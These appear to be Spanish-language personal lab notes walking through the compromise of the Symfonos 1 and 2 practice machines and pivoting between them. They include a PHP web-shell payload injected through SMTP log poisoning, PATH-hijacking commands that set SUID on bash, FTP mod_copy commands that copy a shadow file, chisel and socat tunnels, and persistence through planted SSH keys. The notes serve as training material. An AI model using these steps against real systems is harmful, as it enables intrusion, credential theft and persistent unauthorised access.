#pivoting #Linux #tecnicas
en este laboratorios vamos a realizar pruebas de pivoting y Tunneling entre 3 maquinas synfonos (1,2,3) 

primero vamos a identificar nuestra interfaz de red para saber en que segmento estamos operando y luego vamos a realizar un escaneo de nuestra red para identificar posibles maquinas que estén activas

```python
	ifconfig

	sudo apr-scan -I eth0 --localnet

	netdiscover -i eth0 -r ip
```

![[Pasted image 20240617144232.png]]

# MAQUINA SYNFONOS 1 - 10.0.2.5

### nmap

```python
# Nmap 7.94SVN scan initiated Mon Jun 17 15:26:13 2024 as: nmap -p- --open -sCV -sS -Pn -n --min-rate 5000 -oN Scan 10.0.2.15
Nmap scan report for 10.0.2.15
Host is up (0.0013s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:19:95:4B (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2024-06-17T14:26:26-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-time: 
|   date: 2024-06-17T19:26:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 17 15:26:27 2024 -- 1 IP address (1 host up) scanned in 14.31 seconds
```

### Enumeración del puerto 80 (http)
analizamos el sitio web que no parece tener nada mas que un simple imagen
![[Pasted image 20240617153736.png]]

`Codigo Fuente`
en el código fuente no encontramos nada interesante 
![[Pasted image 20240617153840.png]]

### Enumeración del puerto 445 (smb)
al realizar una enumeración de los recursos compartidos encontramos que tenemos permios de lectura sobre el recurso compartido `anonymous`
![[Pasted image 20240617154042.png]]

### smbclient
utilizaremos la herramienta `smbclient` para iniciar una conexión con una `NULL-SESSION` en el recurso compartido y descargamos el archivo con `get`
![[Pasted image 20240617155753.png]]

`attention.txt`
este archivo contiene una nota de la cual podemos extraer 3 passwords y también un usuario así que vamos a guardar esta información en nuestra maquina 
![[Pasted image 20240617160155.png]]

### crackmapexec
usamos `crackmapexec` para enumerar usuarios validos en el sistema y obtuvimos el usuarios `helios` 
![[Pasted image 20240617160709.png]]

### smbmap
establecemos una conexión con `smbmap` a los recursos compartidos con las credenciales que hemos conseguido y ahora tenemos lectura sobre un recurso llamado helios/
![[Pasted image 20240617161332.png]]

`helios`
dentro del directorios de helios encontramos dos archivos que podemos descargar usando el siguiente comando 

```python
	❯ smbmap -H 10.0.2.15 -u helios -p qwerty --download helios/research.txt

	❯ smbmap -H 10.0.2.15 -u helios -p qwerty --download helios/todo.txt
```

![[Pasted image 20240617162359.png]]

`cat`
al leer los archivos el `research.txt` parece no ser nada importante. `todo.txt` parece ser una serie de tareas para trabajar sobre el dominio de `/h3l105` asi que vamos a ver a donde nos lleva este dominio
![[Pasted image 20240617162726.png]]

### Enumeración web
el `wappalyzer` nos indica que estamos ante un `wordPress 5.2.2` también logramos ver el dominio a donde nos estamos dirigiendo sin embargo no esta cargando correctamente
![[Pasted image 20240617163139.png]]

### etc/hosts
mirando el código fuente nos damos cuenta que la web esta tirando del dominio `synfonos.local` así que debemos agregar esto a nuestro hosts
![[Pasted image 20240617163418.png]]

`etc/hosts`
agregamos la ruta en nuestro archivo
![[Pasted image 20240617163631.png]]

### web
recargamos la pagina y podemos ver efectivamente como se esta cargando correctamente
![[Pasted image 20240617163729.png]]

### hacktricks
en la pagina de [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) podemos obtener información de como enumerar plugins con el siguiente comando

```python
> curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```

![[Pasted image 20240617163950.png]]

### Enumeración de plugins WordPress
con este comando logramos enumerar los plugins

```python
> ❯ curl -H 'Cache-Control: no-cache, no-store' -L -ik -s http://symfonos.local/h3l105/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

y con este comando vamos a limpiar el ouput para verlo de una mejor manera
```python
❯ curl -H 'Cache-Control: no-cache, no-store' -L -ik -s http://symfonos.local/h3l105/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2 | cut -d "/" -f 7 | sort -u
```

obtenemos dos plugins que parecen ser vulnerables
![[Pasted image 20240617165639.png]]

### searchsploit
encontramos tres exploits para este plugin así que vamos a ejecutarlos para tratar de obtener acceso 
![[Pasted image 20240617170025.png]]

`searchsploit -x php/webapps/40290.txt`
al parecer este plugin es vulnerable a un `LFI (Local File Inclusion)` lo que nos va a permitir leer archivos dentro de la maquina
![[Pasted image 20240617170237.png]]

### LFI (Local File Inclusion)
realizamos una petición a la ruta que nos indica la vulnerabilidad pasando el parámetro `/etc/passwd` logramos leer el archivo por lo que se ha ejecutado con exito el `LFI`

![[Pasted image 20240617170644.png]]

### Log mail poisoning 
debido a que podemos ver `log/` en el directorio `/var/mail/helios` podemos intentar acceder a los mail para intentar envenenar alguno y de esta manera conseguir un `RCE (Remote Code Execusion)`
![[Pasted image 20240617171417.png]]
![[Pasted image 20240617171433.png]]

### telnet 
si enviamos un mail usando telnet luego haciendo un `curl` al directorio `/var/mail/helios` podemos ver esa peticion. pero el codigo que enviamos no se esta mostrando por lo que parece que se esta interpretando

```python
telnet 10.0.2.15 25
Trying 10.0.2.15...
Connected to 10.0.2.15.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM:gleoq@test.com
250 2.1.0 Ok
RCPT TO:helios@symfonos.localdomain
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php echo system($_REQUEST['cmd']);?>

.
250 2.0.0 Ok: queued as 4F54440729

```

aqui podemos ver como el usuario `gleoq@test.com` ha enviado un correo a `helios@symfonos.localdomain`
![[Pasted image 20240617203318.png]]

`id`
agregamos el operador `&cmd=id` para hacer una prueba y efectivamente tenemos ejecución de comandos
![[Pasted image 20240617204332.png]]


### reverse shell

![[Pasted image 20240617205629.png]]

### Escalada de privilegios
el binario `/opt/statuscheck` es muy raro así que vamos a mirarlo
![[Pasted image 20240617211120.png]]

`/opt/statuscheck` 
vemos que el archivo esta haciendo un llamado al comando `curl` pero lo esta haciendo desde la ruta relativa. esto es muy peligroso ya que es vulnerable a `PATH HIJACKING`
![[Pasted image 20240617211311.png]]

### Path hijacking
El "path hijacking" (secuestro de rutas) es una técnica que explota la vulnerabilidad en la secuencia de búsqueda de archivos de un sistema operativo para ejecutar código malicioso. Este ataque se basa en la manipulación de la forma en que los sistemas y las aplicaciones localizan y cargan archivos ejecutables, bibliotecas, o scripts, redirigiendo el flujo de ejecución hacia un archivo malicioso en lugar del archivo legítimo

```python
> echo "chmod u+s /bin/bash" > curl (creamos un archivo llamado curl el cual comtiene comandos para cambiar los permisos de la bash)

> chmod +x curl (otorgamos permisos al archivo curl que hemos creado)

> export PATH=/tmp:$PATH (exportamos el directorio donde esta nuestro archivo al PATH)

> /opt/statuscheck (ejecutamos el binario donde tenemos permisos SUID)

> bash -p (llamamos una bash como root)

```

### Root
![[Pasted image 20240617212602.png]]

### chisel
enviamos el binario de chisel a la maquina victima usando el siguiente comando

```python
scp chisel root@ip:/dev/shm
```
`Nota: este comando es posible ya que hemos logrado persistencia en la maquian victima enviando nuestra authorized_kys para lograr una conexión via ssh. de lo contrario podemos montar un servidor en python y descargarlo con un wget`

![[Pasted image 20240618171950.png]]

### Tunneling And Pivoting
iniciamos un servidor en chisel escuchando por el puerto 8000

```python
	./chisel server --reverse -p 8000

	./chisel client 10.0.2.4:8000 R:socks
```

![[Pasted image 20240619124748.png]]

### proxychains
nos aseguramos que el archivo de configuración del proxychains tenga habilitada la opción `dynamic_chain` que la vamos a necesitar mas adelanta

```python
nano /etc/proxychains4.conf
```

![[Pasted image 20240618173459.png]]

### Reconocimiento de la segunda red
con un bucle `for` vamos hacer un reconocimiento de todas las `ips` que estén activas en el segundo segmento de red

```python
Synfonos-1 ip1: 10.0.2.5

Symfonos-1 ip2:10.2.2.6

	for i in {1..256} ;do (ping -c 1 10.2.2.$i | grep "bytes from" &) ;done
```

lanzamos este bucle en el segundo segmento (ip2) para reconocer las `ips` que estén activas en este segundo rango de `ips` 

```python
64 bytes from 10.2.2.1: icmp_seq=1 ttl=255 time=1.28 ms ||||| LOOPBACK
64 bytes from 10.2.2.2: icmp_seq=1 ttl=128 time=2.35 ms ||||| BROADCAST
64 bytes from 10.2.2.3: icmp_seq=1 ttl=255 time=0.283 ms||||| GET-WEY
64 bytes from 10.2.2.6: icmp_seq=1 ttl=64 time=0.013 ms Symfonos-1 ip:1
64 bytes from 10.2.2.7: icmp_seq=1 ttl=64 time=0.413 ms Symfonos-1 ip:2
```

![[Pasted image 20240618175115.png]]

### Escaneo de red symfonos-1 segmento de red 2

```python
	sudo proxychains nmap -sT -Pn -p 1-1000 -T5 -v -n 10.2.2.7
```

#Nota: hacemos un escaneo basico del top 1000 de los puertos comunes debido a que proxychains no es capas de manejar todo el volumen de los puertos. este escaneo basico nos permite identificar de manera rapida los puertos a los cuales tenemos conexion

![[Pasted image 20240618203733.png]]

### Transferencia de archivos

```python
	which nmap

	cp /usr/bin/nmap .

	python3 -m http.server 80
```

copiamos el binario de nmap a nuestro directorio actual y luego lo compartimos con un servidor de Python
![[Pasted image 20240618204241.png]]

`symfonos-1`
de esta manera obtenemos el binario de nmap en la maquina victima
![[Pasted image 20240618204545.png]]

### nmap scan synfonos-2
con el binario de nmap ejecutado desde la maquina victima(symfonos-1) confirmamos que estos son los puertos abiertos en la maquina
![[Pasted image 20240618205554.png]]

# Maquina Symfonos-2
### Proxychains scan synfonos-2
ahora que estamos seguro de todos los puertos podemos realizar un nuevo escaneo de nmap usando proxychains para obtener los servicios y las versiones que están corriendo en estos puertos

```python
	sudo proxychains nmap -sT -p 21,22,80,139,445 -sCV -Pn -n --min-rate 5000 10.2.2.7
```

![[Pasted image 20240618205838.png]]

`searchsploit ftp 1.3.5`
encontramos una vulnerabilidad para esta versión de ftp que nos permite copiar archivos. 
![[Pasted image 20240618211709.png]]

`proxychains ftp`
intentamos obtener una conexión como `anonymous` pero parece que no esta configurado por default así que por ahora no podemos hacer mucho por aqui. seguiremos enumerando
![[Pasted image 20240618211905.png]]

`proxychains smbmap` 
realizamos una enumeración de los recursos compartidos y vemos que tenemos permisos de lectura sobre el recurso compartido de `Anonymous`
![[Pasted image 20240618210839.png]]

`proxychains smbclient`
logramos descargar un archivo llamado `log.txt` para analizarlo en nuestra maquina
![[Pasted image 20240618211207.png]]

`log.txt`
en la primera linea podemos ver que el usuario `root` ha echo un `cat` sobre la ruta `/etc/shadow` y luego ha hecho una especie de copia de seguridad en la ruta `/var/backups/shadow.bak` 
![[Pasted image 20240618212903.png]]

`path`
en esta parte vemos que el recurso compartidos de `anonymous` se esta ejecutando bajo la ruta `/home/aelous/share` aquí podemos obtener un posible usuario `aelous` 
`aqui se me ocurre que si el usuario root esta haciendo una copia del /etc/shadow en esta dirección > /var/backups/shadow.bak y el servicio ftp es vulnerable a copias de archivos entonces nosotros podriamos traernos el archivo /var/backups a la dirección de /home/aelous/share y luego nos conectamos al recurso anonymous donde tenemos leptura y de esta manera podriamos ver el archivo` 
![[Pasted image 20240618213211.png]]

### Searchsploit
esta es la vulnerabilidad que vimos anteriormente que nos permite copiar archivos así que vamos a ver que nos dice..
```python
❯ searchsploit -x linux/remote/36742.txt
```
básicamente esta vulnerabilidad nos indica que podemos hacer `site cpfr /etc/passwd (la ruta que queremos copiar)` y después `site cpto /tmp/passwd.copy (ruta donde queremos hacer la copia)`
![[Pasted image 20240618214236.png]]

`proxychains telnet`
realizamos la copia efectiva del archivo al directorio donde tenemos permisos de lectura

```python
site cpfr /var/backups/shadow.bak

site cpto /home/aeolus/share/shadow.bak

250 Copy successful
```

![[Pasted image 20240618215019.png]]

`proxychains smbclient`
ahora nos conectamos al recurso compartido donde tenemos permisos de lectura y podemos ver el archivo así que lo descargamos para leerlo en nuestra maquina
![[Pasted image 20240618215312.png]]

`shadow.bak`
efectivamente aquí tenemos el archivo `shadow` de la maquina symfonos-2
![[Pasted image 20240618215530.png]]

### hashcat
copiamos las claves de los usuarios `aeolus y cronus` en un archivo llamado creds.tx y lo vamos a descifrar con hashcat
![[Pasted image 20240618220252.png]]

`Status`
obtenemos la clave del usuarios `aelous` ahora podemos usar estas credenciales para conectarnos por `ssh`
![[Pasted image 20240618220545.png]]

### proxychains ssh
nos conectamos a la maquina symfonos-2 vía ssh usando como intermedio a proxychains
![[Pasted image 20240618221228.png]]

### Enumeración web Symfonos-2 (Port 80)
en nuestra pantalla de `Pivoting And Tunneling` vamos a crear un nuevo tunel para traernos el puerto 80 de la maquina symgonos-2 de manera local en nuestro puerto 8090

```python
	❯ proxychains ssh aeolus@10.2.2.7 -L 8090:localhost:80
```

![[Pasted image 20240619132508.png]]

### web symfonos-2 (Port 80)
tenemos una web parecida a la symfonos-1 de momento no tenemos nada importante
![[Pasted image 20240619132257.png]]

### Fuzzing Symfonos-2
después de hacer Fuzzing no tenemos nada en esta web así que seguimos vamos a seguir enumerando para intentar obtener acceso privilegiado a la maquina
![[Pasted image 20240619134251.png]]

### Enumeración de puertos internos
primero que nada vamos a echar un vistazo a la web que esta corriendo en el puerto 808
![[Pasted image 20240619130754.png]]

### Enumeración web Symfonos-2 (Port 8080)
en nuestra pantalla de `Pivoting And Tunneling` vamos a crear un nuevo túnel para traernos el puerto 8080 de la maquina symgonos-2 de manera local en nuestro puerto 8181 
![[Pasted image 20240619142027.png]]

### web Symfonos-2 (Port 8080)
hemos logrado traernos el puerto 8080 de la maquina symfonos-2 el cual esta corriendo de manera local. a nuestra maquina atacante de manera local en el puerto 8181
![[Pasted image 20240619142317.png]]

### LibreNMS

![[Pasted image 20240619151707.png]]

hemos reutilizado las credenciales que de `aeolus` y obtenemos acceso a la web
![[Pasted image 20240619151518.png]]

### Vulnerabilidades
esta vulnerabilidad crea un nuevo dispositivo y luego lo registra de en la web para posteriormente llamarlo. en esca caso ejecutaremos esto de manera manual

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad                     | Tipo    | Nivel | Link                                                  |
| -------------- | ----------------------------------------------- | ------- | ----- | ----------------------------------------------------- |
| CVE-2018-20434 | LibreNMS 1.46 - 'addhost' Remote Code Execution | webapps | 9.8   | [LibreNMS](https://www.exploit-db.com/exploits/47044) |
|                |                                                 |         |       |                                                       |
|                |                                                 |         |       |                                                       |


`Add Divice`
aquí vamos a crear un dispositivo y llenamos los campos
![[Pasted image 20240619153907.png]]
`Add Divice`
la variable `payload` la pegamos en `community` y la opción `Force add` debe estar activa.

#Nota: es importante entender que para enviarnos una `reverse shell` a nuestra maquina `atacante` pero no tenemos conexión directa desde `symfonos-2` a nuestra `maquina atacante`. por lo tanto tenemos que enviar esta shell directamente a la maquina mas cercana entre la `symfonos-2` y la `maquina atacante`, en este caso seria la maquina `symfonos-1` donde estaremos a la escucha por el puerto `1221` y luego dirigir ese trafico a la maquina `atacante` donde estaremos a la escucha por el puerto `9001` 
![[Pasted image 20240619154619.png]]

`agregamos el dispositivo`
![[Pasted image 20240619155825.png]]

### socat
con un servidor en python nos compartimos el binario de `socat` con la maquina `symfonos-1`
![[Pasted image 20240619160023.png]]

`Descargamos el binario`
![[Pasted image 20240619160126.png]]

### Pivoting And Tunneling
ahora en nuestra pantalla de `Pivoting And Tunneling` vamos crear el túnel por donde vamos a recibir la información para luego redireccionarlo 
![[Pasted image 20240619162613.png]]

### Ejecución de LibreNMS 1.46 - 'addhost' Remote Code Execution'
ahora buscamos el dispositivo que hemos agregado y vamos a ejecutarlo. revisando el `exploit` vemos que hacen un llamado del dispositivo bajo la variable `capture` la cual vemos si vamos al meno engranaje `> capture > SNMP > Run` 
![[Pasted image 20240619162907.png]]

### conexión Symfonos-2 > Symfonos-1 > Maquina atacante (Attack)
logramos obtener conexión a la maquina `symfonos-2 pero como el usuario cronus`
![[Pasted image 20240619163334.png]]

### Escalada de privilegios Symfonos-2
en este caso tenemos permisos root para ejecutar el binario `/usr/bin/mysql/` vamos aprovechar esto para escalar privilegios
![[Pasted image 20240619164428.png]]

### GTFObins
debemos ejecutar esta instrucción para lograr obtener unas bash con privilegios
![[Pasted image 20240619174020.png]]

### Root
explotando este binario logramos conseguir una bash con privilegios elevados
#Nota: hacemos una copia de nuestra `authorized_keys` en la maquina `symfonos-2` para de esta manera asegurar la persistencia y así poder salir y entrar cuando queramos
![[Pasted image 20240619174131.png]]



[GraficoPivoting](obsidian://open?vault=ObsidianGIT&file=Excalidraw%2FPivoting.excalidraw) 